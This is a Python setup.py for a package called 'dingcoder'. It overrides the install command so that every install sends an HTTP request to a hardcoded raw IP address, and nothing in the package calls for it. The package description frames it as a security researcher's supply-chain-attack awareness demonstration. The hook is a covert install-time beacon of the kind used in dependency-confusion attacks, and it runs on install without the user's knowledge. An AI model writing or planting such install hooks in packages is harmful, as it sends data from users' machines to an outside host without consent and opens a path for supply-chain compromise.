#!/usr/bin/env python
# coding: utf-8

from setuptools import setup
from setuptools.command.install import install
import requests

class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        url = 'http://101.32.99.28/name?dingcoder'
        requests.get(url, timeout=30)

setup(
    name='dingcoder',
    version='8.8.8',
    author='RemindSupplyChainRisks',
    author_email='RemindSupplyChainRisks@gmail.com',
    url='https://github.com/dingcoder',
    description='Remind Supply Chain Risks: I am a security researcher, the purpose is to make everyone pay attention to software supply chain attacks, because the risks are too great.',
    packages=['dingcoder'],
    install_requires=['requests'],
    cmdclass={
        'install': CustomInstallCommand,
    },
)

